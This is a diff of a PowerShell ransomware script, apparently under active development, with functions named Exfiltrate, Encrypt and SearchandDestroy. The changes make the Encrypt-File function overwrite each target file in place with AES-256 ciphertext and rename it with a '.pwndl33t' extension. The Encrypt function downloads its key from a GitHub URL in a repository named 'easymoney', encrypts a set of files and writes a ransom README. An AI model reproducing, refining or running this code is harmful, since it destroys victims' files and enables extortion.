@@ -171,44 +171,33 @@ function Exfiltrate
     Remove-Item $ZipPath
 }
 
-function Encrypt-File 
+ function Encrypt-File 
 {
 
- param(
-        [Parameter(Mandatory = $false)]
-        [string]$Password,
+    param(
 
-        [Parameter(Mandatory = $false)]
-        [Object]$AesKey,
+            [Parameter(Mandatory = $true)]
+            [Object]$AesKey,
 
-        [Parameter(Mandatory = $true)]
-        [string]$FilePath
-    )
+            [Parameter(Mandatory = $true)]
+            [string]$FilePath
+        )
 
-    if (-not $Password -and -not $AesKey) {
-        throw "You must provide either Password or AesKey."
-    }
+    $encExtension=".pwndl33t"
 
     $aes = [System.Security.Cryptography.Aes]::Create()
     $aes.KeySize = 256
     $aes.BlockSize = 128
 
     # ----- KEY HANDLING -----
-    if ($AesKey) {
-        if ($AesKey -is [string]) {
-            $keyBytes = [Convert]::FromBase64String($AesKey)
-        }
-        elseif ($AesKey -is [byte[]]) {
-            $keyBytes = $AesKey
-        }
-        else {
-            throw "AesKey must be Base64 string or byte array."
-        }
+    if ($AesKey -is [string]) {
+        $keyBytes = [Convert]::FromBase64String($AesKey)
+    }
+    elseif ($AesKey -is [byte[]]) {
+        $keyBytes = $AesKey
     }
     else {
-        $keyBytes = [System.Text.Encoding]::UTF8.GetBytes(
-            $Password.PadRight(32,'0').Substring(0,32)
-        )
+        throw "AesKey must be Base64 string or byte array."
     }
 
     $aes.Key = $keyBytes
@@ -220,14 +209,14 @@ function Encrypt-File
 
     $combined = $aes.IV + $encryptedBytes
 
-    [System.IO.File]::WriteAllBytes("$FilePath$encExtension", $combined)
+    [System.IO.File]::WriteAllBytes($FilePath, $combined)
 
     $aes.Dispose()
-}
 
+    Rename-Item -Path $FilePath -NewName ($FilePath + $encExtension)
+} 
 
-
-function Encrypt 
+ function Encrypt 
 {
     param(
         [Parameter(Mandatory=$true)]
@@ -240,6 +229,10 @@ function Encrypt
 
     $KeyUrl = "https://github.com/bsoroudi/easymoney/blob/updates/key?raw=true"
     $keyBase64 = Invoke-RestMethod -Uri $KeyUrl
+    
+    # Remove BOM, whitespace, CR, LF, ZWNBSP, tabs
+    $keyBase64 = $keyBase64.Trim() -replace "^[\uFEFF\u200B]+",""
+
     $keyBytes = [Convert]::FromBase64String($keyBase64)
 
     # Encrypt each file
@@ -247,10 +240,10 @@ function Encrypt
 
     foreach ($file in $files) {
         Encrypt-File -FilePath $file.FullName -AesKey $keyBytes
-        Remove-Item $file.FullName
+        #Remove-Item $file.FullName
     }
 
-    Write-Host "Encryption complete. AES key saved to: $keyFile"
+    Write-Host "Encryption complete."
     
      #README content
     $readmeContent = 
@@ -274,8 +267,7 @@ function Encrypt
 
     Write-Host "README.txt created at: $readmePath"
 
-}
-
+} 
 
 
 function SearchandDestroy
